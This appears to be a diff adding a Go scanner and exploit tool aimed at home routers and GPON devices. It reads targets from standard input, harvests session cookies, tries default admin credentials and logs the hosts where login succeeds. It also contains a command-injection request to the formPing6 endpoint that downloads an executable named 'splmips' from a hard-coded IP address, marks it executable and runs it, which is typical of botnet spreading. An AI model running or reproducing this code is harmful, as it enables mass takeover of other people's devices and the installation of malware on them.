@@ -1,0 +1,212 @@
+/*
+found by @fdb2sxy
+
+he is really sexy
+*/
+
+package main
+
+import (
+	"bufio"
+	"fmt"
+	"math/rand"
+	"net"
+	"os"
+	"runtime"
+	"strconv"
+	"strings"
+	"sync"
+	"time"
+)
+
+var (
+	file, err = os.OpenFile("webproc.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+)
+
+var syncWait sync.WaitGroup
+var statusCookie, statusLogins, statusAttempted, statusFound int
+var loginsString = []string{"admin:admin", "admin:"}
+
+func zeroByte(a []byte) {
+	for i := range a {
+		a[i] = 0
+	}
+}
+
+func sendExploit(target string) int {
+
+	conn, err := net.DialTimeout("tcp", target, 60*time.Second)
+	if err != nil {
+		return -1
+	}
+
+	conn.SetWriteDeadline(time.Now().Add(60 * time.Second))
+	conn.Write([]byte("POST /boaform/admin/formPing6 HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\n\r\npingAddr=2;cd+/var;wget+45.88.90.144/splmips;+chmod+777+*;./splmips+tenda&wanif=65535&go=+Go&submit-url=/ping6.asp\r\n\r\n"))
+	conn.SetReadDeadline(time.Now().Add(60 * time.Second))
+
+	bytebuf := make([]byte, 512)
+	l, err := conn.Read(bytebuf)
+	if err != nil || l <= 0 {
+		conn.Close()
+		return -1
+	}
+
+	return -1
+}
+
+func sendLogin(target string, phpSessID string) int {
+
+	var isLoggedIn int = 0
+	var cntLen int
+
+	for x := 0; x < len(loginsString); x++ {
+		loginSplit := strings.Split(loginsString[x], ":")
+
+		conn, err := net.DialTimeout("tcp", target, 60*time.Second)
+		if err != nil {
+			return -1
+		}
+
+		cntLen = 14
+		cntLen += len(loginSplit[0])
+		cntLen += len(loginSplit[1])
+
+		conn.SetWriteDeadline(time.Now().Add(60 * time.Second))
+   	conn.Write([]byte("POST /cgi-bin/webproc HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-GB,en;q=0.5\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nContent-Length: 177\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: language=en_us; sys_UserName=admin; sessionid="+ phpSessID +"\r\nOrigin: http://" + target + "\r\nReferer: http://" + target + "/cgi-bin/webproc\r\nUpgrade-Insecure-Requests: 1\r\n\r\ngetpage=html%2Findex.html&errorpage=html%2Fmain.html&var%3Amenu=setup&var%3Apage=wizard&obj-action=auth&%3Ausername=admin&%3Apassword=admin&%3Aaction=login&%3Asessionid="+ phpSessID +"\r\n\r\n"))
+		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
+
+		bytebuf := make([]byte, 512)
+		l, err := conn.Read(bytebuf)
+    fmt.Println(string(bytebuf))
+		if err != nil || l <= 0 {
+			conn.Close()
+			return -1
+		}
+
+		if strings.Contains(string(bytebuf), "HTTP/1.0 302 Found") {
+			isLoggedIn = 1
+		}
+
+		zeroByte(bytebuf)
+
+		if isLoggedIn == 0 {
+			conn.Close()
+			continue
+		}
+
+		fmt.Printf("%s (%s)\r\n", target, loginsString[x])
+
+		file.WriteString(target + "\r\n")
+
+		statusLogins++
+		conn.Close()
+		break
+	}
+
+	if isLoggedIn == 1 {
+		return 1
+	} else {
+		return -1
+	}
+}
+
+func checkDevice(target string, rtarget string, timeout time.Duration) int {
+
+	var isGpon int = 0
+
+	conn, err := net.DialTimeout("tcp", target, timeout*time.Second)
+	if err != nil {
+		return -1
+	}
+	conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
+	conn.Write([]byte("GET /cgi-bin/webproc HTTP/1.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en,en-US;q=0.9\r\nCache-Control: max-age=0\r\nUpgrade-Insecure-Requests: 1\r\nReferer: http://" + target + "/cgi-bin/webproc\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\n\r\n\r\n\r\n"))
+	conn.SetReadDeadline(time.Now().Add(timeout * time.Second))
+
+	bytebuf := make([]byte, 512)
+	l, err := conn.Read(bytebuf)
+  //fmt.Println(string(bytebuf))
+	if err != nil || l <= 0 {
+		conn.Close()
+		return -1
+	}
+
+  response := string(bytebuf[:l])
+
+  var phpSessID string
+  headerName := "set-cookie: sessionid="
+  if strings.Contains(response, headerName) {
+  		statusFound++
+		  isGpon = 1
+      headerStart := strings.Index(response, headerName)
+      headerEnd := strings.Index(response[headerStart+len(headerName):], ";")
+      if headerEnd == -1 {
+          headerEnd = len(response) - headerStart - len(headerName)
+      }
+      phpSessID = response[headerStart+len(headerName) : headerStart+len(headerName)+headerEnd]
+      statusCookie++
+      // You don't need to add "sessionid=" prefix here, as it's already part of the header
+      fmt.Println("Cookie:", phpSessID)
+  }
+/*
+	if strings.Contains(string(bytebuf), "200 OK") {
+    fmt.Println(string(bytebuf))
+		statusFound++
+		isGpon = 1
+	}
+*/
+	zeroByte(bytebuf)
+
+	if isGpon == 0 {
+		conn.Close()
+		return -1
+	}
+
+	conn.Close()
+ 	sendLogin(target, phpSessID)
+	return 1
+}
+/*
+func processTarget(target string, rtarget string) {
+
+	defer syncWait.Done()
+
+	if checkDevice(target, 30) == 1 {
+		sendLogin(target)
+		sendExploit(target)
+		return
+	} else {
+		return
+	}
+}
+*/
+func main() {
+	max, _ := strconv.Atoi(os.Args[2])
+
+	rand.Seed(time.Now().UTC().UnixNano())
+	var i int = 0
+	go func() {
+		for {
+			fmt.Printf("%d's | Total: %d, Found: %d, Logins: %d Cookies: %d\r\n", i, statusAttempted, statusFound, statusLogins, statusCookie)
+			time.Sleep(1 * time.Second)
+			i++
+		}
+	}()
+
+	for {
+		r := bufio.NewReader(os.Stdin)
+		scan := bufio.NewScanner(r)
+		for scan.Scan() {
+			for runtime.NumGoroutine() > max {
+				time.Sleep(1 * time.Second)
+			}
+
+			if os.Args[1] != "manual" {
+				go checkDevice(scan.Text()+":"+os.Args[1], scan.Text(), 30)
+			} else {
+				go checkDevice(scan.Text(), scan.Text(), 30)
+			}
+			statusAttempted++
+			syncWait.Add(1)
+		}
+	}
+}
